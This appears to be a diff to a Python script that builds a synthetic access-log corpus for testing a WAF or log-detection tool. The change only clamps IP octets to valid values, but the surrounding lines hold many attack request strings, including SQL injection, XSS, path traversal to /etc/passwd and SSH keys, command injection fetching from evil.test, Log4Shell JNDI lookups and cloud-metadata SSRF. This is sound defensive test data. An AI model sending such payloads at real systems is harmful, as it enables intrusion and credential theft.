@@ -17,6 +17,11 @@ UA_NIKTO = "Nikto/2.5.0"
 UA_NORMAL = "Mozilla/5.0 (compatible; EvilBot/1.0)"
 
 
+def v4_last(host: int) -> int:
+    """Gecerli IPv4 son oktet (1..254)."""
+    return 1 + (int(host) % 254)
+
+
 def line(ip: str, method: str, path: str, status: int = 200, ua: str = UA_NORMAL) -> str:
     return f'{ip} - - [{TS}] "{method} {path} HTTP/1.1" {status} 512 "-" "{ua}"'
 
@@ -73,7 +78,7 @@ def main() -> None:
         "/odeme?kart=1%27+AND+SUBSTRING(version(),1,1)=%275%27--",
     ]
     for i, p in enumerate(sqli_paths):
-        add("sqli", f"198.51.100.{10 + i % 40}", "GET", p)
+        add("sqli", f"198.51.100.{v4_last(10 + i % 40)}", "GET", p)
 
     # XSS
     xss_paths = [
@@ -94,7 +99,7 @@ def main() -> None:
         "/preview?doc=<embed+src=javascript:alert(1)>",
     ]
     for i, p in enumerate(xss_paths):
-        add("xss", f"203.0.113.{20 + i % 30}", "GET", p)
+        add("xss", f"203.0.113.{v4_last(20 + i % 30)}", "GET", p)
 
     # Path traversal / LFI
     lfi_paths = [
@@ -112,7 +117,7 @@ def main() -> None:
         "/backup?dir=../../../root/.ssh/id_rsa",
     ]
     for i, p in enumerate(lfi_paths):
-        add("lfi", f"192.0.2.{30 + i % 20}", "GET", p)
+        add("lfi", f"192.0.2.{v4_last(30 + i % 20)}", "GET", p)
 
     # RCE / command injection
     rce_paths = [
@@ -130,7 +135,7 @@ def main() -> None:
         "/proxy?url=file:///etc/passwd",
     ]
     for i, p in enumerate(rce_paths):
-        add("rce", f"198.18.0.{40 + i % 15}", "GET", p)
+        add("rce", f"198.18.0.{v4_last(40 + i % 15)}", "GET", p)
 
     # Scanner / bot UA
     scanner_hits = [
@@ -151,7 +156,7 @@ def main() -> None:
         ("/cgi-bin/luci", UA_NIKTO),
     ]
     for i, (p, ua) in enumerate(scanner_hits):
-        add("scanner", f"203.0.113.{100 + i}", "GET", p, 404, ua)
+        add("scanner", f"203.0.113.{v4_last(100 + i)}", "GET", p, 404, ua)
 
     # Brute/auth abuse — login+SQLi (flood LIVE=1; tum path URL-safe)
     auth_paths = [
@@ -167,7 +172,7 @@ def main() -> None:
         "/uye/giris?email=admin%27+OR+1%3D1--",
     ]
     for i, p in enumerate(auth_paths):
-        add("brute", f"198.51.100.{150 + i}", "POST", p, 401 if i % 2 else 200)
+        add("brute", f"198.51.100.{v4_last(150 + i)}", "POST", p, 401 if i % 2 else 200)
 
     # SSRF (metadata / internal)
     ssrf_paths = [
@@ -181,7 +186,7 @@ def main() -> None:
         "/avatar?u=http://localhost/server-status",
     ]
     for i, p in enumerate(ssrf_paths):
-        add("ssrf", f"10.0.0.{200 + i}", "GET", p)
+        add("ssrf", f"10.0.0.{v4_last(200 + i)}", "GET", p)
 
     # TR e-ticaret / panel tarama (scanner UA + tipik path)
     tr_paths = [
@@ -195,7 +200,7 @@ def main() -> None:
         ("/.env.backup", UA_SCAN),
     ]
     for i, (p, ua) in enumerate(tr_paths):
-        add("tr_scan", f"185.220.101.{i}", "GET", p, 403, ua)
+        add("tr_scan", f"185.220.101.{v4_last(i)}", "GET", p, 403, ua)
 
     # GraphQL / API abuse (waf graphql_patterns ile eslesen)
     api_paths = [
@@ -209,7 +214,7 @@ def main() -> None:
         "/api/gql?query=__schema",
     ]
     for i, p in enumerate(api_paths):
-        add("api_abuse", f"10.0.0.{50 + i}", "GET", p)
+        add("api_abuse", f"10.0.0.{v4_last(50 + i)}", "GET", p)
 
     # POST SQLi — log_guardian $request_body (offline replay)
     post_attacks = [
@@ -229,7 +234,7 @@ def main() -> None:
             {
                 "category": "post_sqli",
                 "line": line_lg(
-                    f"203.0.113.{210 + i}",
+                    f"203.0.113.{v4_last(210 + i)}",
                     method,
                     path,
                     401 if i % 2 else 200,
@@ -265,7 +270,7 @@ def main() -> None:
         ("/manager/html", UA_NIKTO),
     ]
     for i, (p, ua) in enumerate(scanner_extra):
-        add("scanner", f"203.0.113.{120 + i}", "GET", p, 404, ua)
+        add("scanner", f"203.0.113.{v4_last(120 + i)}", "GET", p, 404, ua)
 
     # Ek SSRF (metadata / loopback)
     ssrf_extra = [
@@ -279,7 +284,7 @@ def main() -> None:
         "/preview?target=http://169.254.169.254/",
     ]
     for i, p in enumerate(ssrf_extra):
-        add("ssrf", f"10.0.0.{210 + i}", "GET", p)
+        add("ssrf", f"10.0.0.{v4_last(210 + i)}", "GET", p)
 
     # Ek POST SQLi ($request_body)
     post_extra = [
@@ -296,7 +301,7 @@ def main() -> None:
         entries.append(
             {
                 "category": "post_sqli",
-                "line": line_lg(f"203.0.113.{230 + i}", method, path, 401, body=body),
+                "line": line_lg(f"203.0.113.{v4_last(230 + i)}", method, path, 401, body=body),
             }
         )
 
@@ -311,7 +316,7 @@ def main() -> None:
         ("/opencart/admin/", UA_SCAN),
     ]
     for i, (p, ua) in enumerate(tr_extra):
-        add("tr_scan", f"185.220.102.{i}", "GET", p, 403, ua)
+        add("tr_scan", f"185.220.102.{v4_last(i)}", "GET", p, 403, ua)
 
     # Ek GraphQL / API abuse
     api_extra = [
@@ -324,7 +329,7 @@ def main() -> None:
         "/graphql/console?query={__schema{mutationType{name}}}",
     ]
     for i, p in enumerate(api_extra):
-        add("api_abuse", f"10.0.0.{60 + i}", "GET", p)
+        add("api_abuse", f"10.0.0.{v4_last(60 + i)}", "GET", p)
 
     # Ek LFI / path traversal
     lfi_extra = [
@@ -338,7 +343,7 @@ def main() -> None:
         "/export?dir=....//....//root/.bash_history",
     ]
     for i, p in enumerate(lfi_extra):
-        add("lfi", f"192.0.2.{50 + i}", "GET", p)
+        add("lfi", f"192.0.2.{v4_last(50 + i)}", "GET", p)
 
     # Ek RCE / command injection
     rce_extra = [
@@ -352,7 +357,7 @@ def main() -> None:
         "/convert?args=;wget+evil.test/x.sh",
     ]
     for i, p in enumerate(rce_extra):
-        add("rce", f"198.18.0.{55 + i}", "GET", p)
+        add("rce", f"198.18.0.{v4_last(55 + i)}", "GET", p)
 
     # Ek SQLi (benzersiz path — tekrarli UNION dongusu yerine cesitlilik)
     sqli_extra = [
@@ -369,13 +374,13 @@ def main() -> None:
         "/stats?dim=1%27+UNION+SELECT+table_name,null+FROM+information_schema.tables--",
     ]
     for i, p in enumerate(sqli_extra):
-        add("sqli", f"198.51.100.{250 + i}", "GET", p)
+        add("sqli", f"198.51.100.{v4_last(250 + i)}", "GET", p)
 
     # Ek SQLi varyantlari (corpus buyutme)
     for i in range(80):
         add(
             "sqli",
-            f"198.51.100.{200 + i}",
+            f"198.51.100.{v4_last(200 + i)}",
             "GET",
             f"/api/v2/item?id=1%27+UNION+SELECT+{i}%2C2--",
         )
@@ -389,7 +394,7 @@ def main() -> None:
         "/embed?src=%3Ciframe+src=javascript:alert(1)%3E",
     ]
     for i in range(40):
-        add("xss", f"203.0.113.{50 + i}", "GET", xss_extra[i % len(xss_extra)])
+        add("xss", f"203.0.113.{v4_last(50 + i)}", "GET", xss_extra[i % len(xss_extra)])
 
     # 2024-2026 CVE-style probe paths
     cve_paths = [
@@ -410,13 +415,13 @@ def main() -> None:
         ("/config/database.yml", UA_NIKTO),
     ]
     for i, (p, ua) in enumerate(cve_paths):
-        add("scanner", f"203.0.113.{140 + i}", "GET", p, 404, ua)
+        add("scanner", f"203.0.113.{v4_last(140 + i)}", "GET", p, 404, ua)
 
     # Ek brute/login abuse
     for i in range(10):
         add(
             "brute",
-            f"198.51.100.{160 + i}",
+            f"198.51.100.{v4_last(160 + i)}",
             "POST",
             f"/api/v2/auth?user=admin%27+OR+1%3D1--&pass=x{i}",
             401,
@@ -439,26 +444,26 @@ def main() -> None:
         entries.append(
             {
                 "category": "post_sqli",
-                "line": line_lg(f"203.0.113.{240 + i}", method, path, 403, body=body),
+                "line": line_lg(f"203.0.113.{v4_last(240 + i)}", method, path, 403, body=body),
             }
         )
 
     # Corpus 500 hedefi — ek varyant donguleri
     for i in range(15):
-        add("ssrf", f"10.0.0.{220 + i}", "GET", f"/fetch?url=http://169.254.169.254/{i}")
+        add("ssrf", f"10.0.0.{v4_last(220 + i)}", "GET", f"/fetch?url=http://169.254.169.254/{i}")
     for i in range(15):
         add(
             "api_abuse",
-            f"10.0.0.{70 + i}",
+            f"10.0.0.{v4_last(70 + i)}",
             "GET",
             f"/graphql?query={{__schema{{types{{name}}}}}}&v={i}",
         )
     for i in range(15):
-        add("lfi", f"192.0.2.{60 + i}", "GET", f"/file?path=..%2f..%2fetc%2fpasswd%2f{i}")
+        add("lfi", f"192.0.2.{v4_last(60 + i)}", "GET", f"/file?path=..%2f..%2fetc%2fpasswd%2f{i}")
     for i in range(15):
-        add("rce", f"198.18.0.{70 + i}", "GET", f"/run?cmd=;id+{i}")
+        add("rce", f"198.18.0.{v4_last(70 + i)}", "GET", f"/run?cmd=;id+{i}")
     for i in range(15):
-        add("tr_scan", f"185.220.103.{i}", "GET", f"/panel{i}/admin/", 403, UA_SCAN)
+        add("tr_scan", f"185.220.103.{v4_last(i)}", "GET", f"/panel{i}/admin/", 403, UA_SCAN)
 
     # --- Corpus 1K: yeni kategoriler + cesitlilik ---
     ssti_paths = [
@@ -489,7 +494,7 @@ def main() -> None:
         "/liquid?x={{7*7}}",
     ]
     for i, p in enumerate(ssti_paths):
-        add("ssti", f"198.51.101.{10 + i}", "GET", p)
+        add("ssti", f"198.51.101.{v4_last(10 + i)}", "GET", p)
 
     xxe_paths = [
         "/upload?xml=%3C!DOCTYPE+foo+[%3C!ENTITY+x+SYSTEM+%22file:///etc/passwd%22%3E%5D%3E%3Cfoo%3E%26x%3B%3C/foo%3E",
@@ -514,7 +519,7 @@ def main() -> None:
         "/rss?feed=%3C!DOCTYPE+i+[%3C!ENTITY+x+SYSTEM+%22file:///etc/passwd%22%3E%5D%3E",
     ]
     for i, p in enumerate(xxe_paths):
-        add("xxe", f"203.0.114.{10 + i}", "GET", p)
+        add("xxe", f"203.0.114.{v4_last(10 + i)}", "GET", p)
 
     # URL-safe: log satirinda ham JSON tırnagi yok (parser kirilmasin)
     nosql_paths = [
@@ -550,7 +555,7 @@ def main() -> None:
         "/graphql?query=users(filter:password[$ne]=null)",
     ]
     for i, p in enumerate(nosql_paths):
-        add("nosql", f"198.18.1.{10 + i}", "GET", p)
+        add("nosql", f"198.18.1.{v4_last(10 + i)}", "GET", p)
 
     jwt_paths = [
         "/api/me?token=eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiJ9.",
@@ -575,7 +580,7 @@ def main() -> None:
         "/oauth/token?jwt=eyJhbGciOiJIUzI1NiJ9.eyJzY29wZSI6ImFkbWluIn0.x",
     ]
     for i, p in enumerate(jwt_paths):
-        add("jwt_abuse", f"10.0.1.{10 + i}", "GET", p)
+        add("jwt_abuse", f"10.0.1.{v4_last(10 + i)}", "GET", p)
 
     redirect_paths = [
         "/redirect?url=http://evil.test/phish",
@@ -600,7 +605,7 @@ def main() -> None:
         "/api/v1/redirect?url=//evil.test",
     ]
     for i, p in enumerate(redirect_paths):
-        add("open_redirect", f"198.51.102.{10 + i}", "GET", p)
+        add("open_redirect", f"198.51.102.{v4_last(10 + i)}", "GET", p)
 
     jndi_paths = [
         "/api?q=${jndi:ldap://evil.test/a}",
@@ -620,7 +625,7 @@ def main() -> None:
         "/api/echo?x=${jndi:ldap://evil.test/e}",
     ]
     for i, p in enumerate(jndi_paths):
-        add("log4shell", f"203.0.115.{10 + i}", "GET", p)
+        add("log4shell", f"203.0.115.{v4_last(10 + i)}", "GET", p)
 
     crlf_paths = [
         "/api/redirect?url=%0d%0aSet-Cookie:evil=1",
@@ -640,7 +645,7 @@ def main() -> None:
         "/callback?u=%0d%0aX-Forwarded-Host:evil.test",
     ]
     for i, p in enumerate(crlf_paths):
-        add("crlf", f"198.51.103.{10 + i}", "GET", p)
+        add("crlf", f"198.51.103.{v4_last(10 + i)}", "GET", p)
 
     upload_paths = [
         "/upload?file=shell.php",
@@ -665,7 +670,7 @@ def main() -> None:
         "/attach?file=webshell.php",
     ]
     for i, p in enumerate(upload_paths):
-        add("webshell", f"192.0.3.{10 + i}", "GET", p, 403, UA_SCAN)
+        add("webshell", f"192.0.3.{v4_last(10 + i)}", "GET", p, 403, UA_SCAN)
 
     # Encoding evasion — SQLi / XSS (WAF bypass varyantlari)
     sqli_evasion = [
@@ -691,11 +696,11 @@ def main() -> None:
         "/api/search?filter=1'%20AND%201=1%20--%20",
     ]
     for i, p in enumerate(sqli_evasion):
-        add("sqli", f"198.51.100.{300 + i}", "GET", p)
+        add("sqli", f"198.51.100.{v4_last(300 + i)}", "GET", p)
     for i in range(30):
         add(
             "sqli",
-            f"198.51.100.{320 + i}",
+            f"198.51.100.{v4_last(320 + i)}",
             "GET",
             f"/api/v3/search?q=1%27+OR+1%3D1--+{i}",
         )
@@ -723,11 +728,11 @@ def main() -> None:
         "/share?x=%3Ctextarea%20onfocus=alert(1)%20autofocus%3E",
     ]
     for i, p in enumerate(xss_polyglot):
-        add("xss", f"203.0.113.{90 + i}", "GET", p)
+        add("xss", f"203.0.113.{v4_last(90 + i)}", "GET", p)
     for i in range(25):
         add(
             "xss",
-            f"203.0.113.{110 + i}",
+            f"203.0.113.{v4_last(110 + i)}",
             "GET",
             f"/api/echo?v={i}&x=%3Cscript%3Ealert({i})%3C/script%3E",
         )
@@ -786,7 +791,7 @@ def main() -> None:
         ("/xmlrpc.php?rsd", UA_SCAN),
     ]
     for i, (p, ua) in enumerate(scanner_2025):
-        add("scanner", f"203.0.113.{160 + i}", "GET", p, 404, ua)
+        add("scanner", f"203.0.113.{v4_last(160 + i)}", "GET", p, 404, ua)
 
     post_1k = [
         ("POST", "/api/v3/login", "username=admin%27+OR+1%3D1--&password=z"),
@@ -834,7 +839,7 @@ def main() -> None:
         entries.append(
             {
                 "category": "post_sqli",
-                "line": line_lg(f"203.0.113.{250 + i}", method, path, 403, body=body),
+                "line": line_lg(f"203.0.113.{v4_last(250 + i)}", method, path, 403, body=body),
             }
         )
 
@@ -871,7 +876,7 @@ def main() -> None:
         "/api/v1/keys/rotate?force=1",
     ]
     for i, p in enumerate(api_1k):
-        add("api_abuse", f"10.0.0.{90 + i}", "GET", p)
+        add("api_abuse", f"10.0.0.{v4_last(90 + i)}", "GET", p)
 
     # Hedef satir sayisina kadar cesitli varyant (distributed=80 sabit kalir)
     fill_specs = [
@@ -909,7 +914,7 @@ def main() -> None:
                 {
                     "category": "post_sqli",
                     "line": line_lg(
-                        f"203.0.117.{(n % 200) + 1}",
+                        f"203.0.117.{v4_last((n % 200) + 1)}",
                         "POST",
                         f"/api/v1/fill/{n}",
                         403 if n % 2 else 401,
